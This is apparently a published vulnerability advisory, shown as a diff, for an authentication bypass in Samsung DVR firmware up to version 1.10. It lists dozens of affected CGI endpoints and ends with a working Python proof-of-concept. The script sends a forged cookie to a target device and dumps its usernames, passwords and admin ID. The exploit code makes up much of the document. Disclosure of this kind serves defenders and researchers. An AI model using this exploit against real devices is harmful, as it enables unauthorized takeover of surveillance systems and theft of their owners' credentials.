@@ -1,0 +1,134 @@
+**************************************************************
+Title: Samsung DVR authentication bypass
+Version affected: firmware version <= 1.10
+Vendor: Samsung - www.samsung-security.com
+Discovered by: Andrea Fabrizi
+Email: andrea.fabrizi@gmail.com
+Web: http://www.andreafabrizi.it
+Twitter: @andreaf83
+Status: unpatched
+**************************************************************
+
+Samsung provides a wide range of DVR products, all working with nearly
+the same firmware. The firmware it's a Linux embedded system that
+expose a web interface through the lighttpd webserver and CGI pages.
+
+The authenticated session is tracked using two cookies, called DATA1
+and DATA2, containing respectively the base64 encoded username and
+password. So, the first advise for the developers is to don't put the
+user credentials into the cookies!
+
+Anyway, the critical vulnerability is that in most of the CGI, the
+session check is made in a wrong way, that allows to access protected
+pages simply putting an arbitrary cookie into the HTTP request. Yes,
+that's all.
+
+This vulnerability allows remote unauthenticated users to:
+- Get/set/delete username/password of local users (/cgi-bin/setup_user)
+- Get/set DVR/Camera general configuration
+- Get info about the device/storage
+- Get/set the NTP server
+- Get/set many other settings
+
+Vulnerables CGIs:
+- /cgi-bin/camera_privacy_area
+- /cgi-bin/dev_camera
+- /cgi-bin/dev_devinfo
+- /cgi-bin/dev_devinfo2
+- /cgi-bin/dev_hddalarm
+- /cgi-bin/dev_modechange
+- /cgi-bin/dev_monitor
+- /cgi-bin/dev_pos
+- /cgi-bin/dev_ptz
+- /cgi-bin/dev_remote
+- /cgi-bin/dev_spotout
+- /cgi-bin/event_alarmsched
+- /cgi-bin/event_motion_area
+- /cgi-bin/event_motiondetect
+- /cgi-bin/event_sensordetect
+- /cgi-bin/event_tamper
+- /cgi-bin/event_vldetect
+- /cgi-bin/net_callback
+- /cgi-bin/net_connmode
+- /cgi-bin/net_ddns
+- /cgi-bin/net_event
+- /cgi-bin/net_group
+- /cgi-bin/net_imagetrans
+- /cgi-bin/net_recipient
+- /cgi-bin/net_server
+- /cgi-bin/net_snmp
+- /cgi-bin/net_transprotocol
+- /cgi-bin/net_user
+- /cgi-bin/rec_event
+- /cgi-bin/rec_eventrecduration
+- /cgi-bin/rec_normal
+- /cgi-bin/rec_recopt
+- /cgi-bin/rec_recsched
+- /cgi-bin/restart_page
+- /cgi-bin/setup_admin_setup
+- /cgi-bin/setup_datetimelang
+- /cgi-bin/setup_group
+- /cgi-bin/setup_holiday
+- /cgi-bin/setup_ntp
+- /cgi-bin/setup_systeminfo
+- /cgi-bin/setup_user
+- /cgi-bin/setup_userpwd
+- /cgi-bin/webviewer
+
+PoC exploit to list device users and password:
+http://www.andreafabrizi.it/download.php?file=samsung_dvr.py
+#!/usr/bin/env python
+#
+#**************************************************************
+#Title: Samsung DVR authentication bypass
+#Version affected: firmware version <= 1.10
+#Vendor: Samsung - www.samsung-security.com
+#Discovered by: Andrea Fabrizi
+#Email: andrea.fabrizi@gmail.com
+#Web: http://www.andreafabrizi.it
+#Twitter: @andreaf83
+#Status: unpatched
+#**************************************************************
+
+
+import urllib2
+import re
+import sys
+
+if __name__ == "__main__":
+
+    if len(sys.argv) != 2:
+        print "usage: %s [TARGET]" % sys.argv[0]
+        sys.exit(1)
+
+    ip = sys.argv[1]
+    headers = {"Cookie" : "DATA1=YWFhYWFhYWFhYQ==" }
+
+    print "SAMSUNG DVR Authentication Bypass"
+    print "Vulnerability and exploit by Andrea Fabrizi <andrea.fabrizi@gmail.com>\n"
+    print "Target => %s\n" % ip
+
+    #Dumping users
+    print "##### DUMPING USERS ####"
+    req = urllib2.Request("http://%s/cgi-bin/setup_user" % ip, None, headers)
+    response = urllib2.urlopen(req)
+    user_found = False
+
+    for line in response.readlines():
+
+        exp = re.search(".*<input type=\'hidden\' name=\'nameUser_Name_[0-9]*\' value=\'(.*)\'.*", line)
+        if exp:
+            print exp.group(1),
+
+        exp = re.search(".*<input type=\'hidden\' name=\'nameUser_Pw_[0-9]*\' value=\'(.*)\'.*", line)
+        if exp:
+            print ": " + exp.group(1)
+            user_found = True
+
+        exp = re.search(".*<input type=hidden name=\'admin_id\' value=\'(.*)\'.*", line)
+        if exp:
+            print "Admin ID => %s" % exp.group(1)
+
+    
+    if not user_found:
+        print "No user found."
